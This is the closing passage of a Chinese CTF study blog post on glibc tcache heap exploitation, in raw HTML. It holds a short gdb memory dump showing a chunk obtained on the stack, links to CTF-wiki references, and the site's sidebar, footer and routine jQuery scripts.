0x7fffffffde40                                                        |</span><br><span class="line">0x7fffffffde40:	0x4242424242424242	0x4242424242424242   &lt;-----------------------|我们得到了一个在栈上的chunk</span><br><span class="line">0x7fffffffde50:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x7fffffffde60:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x7fffffffde70:	0x4242424242424242	0x0000000000000000</span><br><span class="line">0x7fffffffde80:	0x00005555555549d0	0x0000555555554750</span><br></pre></td></tr></table></figure>
+
+<p>被unsorted bin attack 利用 参考 <a href="https://p1kk.github.io/2019/10/23/unsorted%20bin%20attack/unsorted%20bin%20attack/" target="_blank" rel="noopener">unsorted bin attack</a></p>
+<blockquote>
+<p>以上参考<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">CTF-wiki</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html" target="_blank" rel="noopener">ctf-all-in-one</a></p>
+</blockquote>
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/笔记/">笔记</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/堆/">堆</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2019/10/31/hdu/hdu/hdu/"  title="HDU by java（很少部分，只作为自己的练习，for test）">
+ <span>HDU by java（很少部分，只作为自己的练习，for test）
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>9</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>14</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HDU/" title="HDU">HDU<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="link1's url" target="_blank" title="link1&#39;s name">link1&#39;s name</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2019 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
